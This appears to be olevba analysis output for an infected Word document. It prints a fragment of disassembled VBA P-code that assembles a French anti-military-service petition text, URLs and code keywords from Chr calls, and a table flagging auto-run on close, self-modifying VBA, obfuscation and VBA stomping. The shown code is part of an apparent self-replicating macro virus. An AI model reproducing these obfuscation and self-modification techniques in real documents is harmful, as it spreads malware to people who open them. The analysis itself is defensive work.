' 	LitStr 0x000A "étudiants,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "salariés,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "rêveurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c1 
' 	QuoteRem 0x0021 0x0008 " kfyllqh"
' Line #180:
' 	Ld c1 
' 	LitStr 0x000E "entrepreneurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "chômeurs,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "voyageurs"
' 	Add 
' 	St c1 
' 	QuoteRem 0x004B 0x000F " yvuqpcqiewhula"
' Line #181:
' 	LineCont 0x0020 09 00 00 00 14 00 00 00 17 00 00 00 4C 00 00 00 60 00 00 00 7B 00 00 00 A6 00 00 00 13 01 00 00
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "tout"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "simplement"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "amoureux"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ont"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "autres"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "projets"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Vie"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b2 
' 	BoS 0x0000 
' 	Ld b2 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "ces"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "10"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "mois."
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Ils"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "refusent"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0009 "effectuer"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "inégalitaire"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b2 
' 	BoS 0x0000 
' 	Ld b2 
' 	LitStr 0x0002 "et"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "dépassé,"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bref"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ne"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sert"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "plus"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "rien."
' 	Add 
' 	St b2 
' 	BoS 0x0000 
' 	LitStr 0x000F "Mobilisons-nous"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "!"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "Pétition"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "pour"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "les"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000B "sursitaires"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "sous"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "travail:"
' 	Add 
' 	St b1 
' 	QuoteRem 0x0061 0x000A " afmsohjth"
' Line #182:
' 	LineCont 0x0008 08 00 00 00 4A 00 00 00
' 	Ld b1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0012 "http://sn.agat.net"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "La"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "révolte"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "militaire:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0022 "http://altern.org/gigm/service.htm"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St b1 
' 	BoS 0x0000 
' 	LitStr 0x0002 "La"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "pétition"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "du"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "magazine"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Don"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "Quichotte:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "http://www.donquichotte.com"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Non"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "S.N."
' 	Add 
' 	St a1 
' 	QuoteRem 0x00A7 0x0007 " pwtwip"
' Line #183:
' 	Ld a1 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "qui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "tue"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "emploi:"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0020 "http://www.multimania.com/antisn"
' 	Add 
' 	St a1 
' 	QuoteRem 0x0081 0x0008 " duxtdym"
' Line #184:
' 	LineCont 0x0004 07 00 00 00
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St e4 
' 	QuoteRem 0x003F 0x000B " lvxktmpynf"
' Line #185:
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j17 
' 	BoS 0x0000 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c7 
' 	QuoteRem 0x0071 0x000C " jpsxeqgovdu"
' Line #186:
' 	EndSub 
' 	QuoteRem 0x0008 0x0008 " bswsfwa"
' Line #187:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

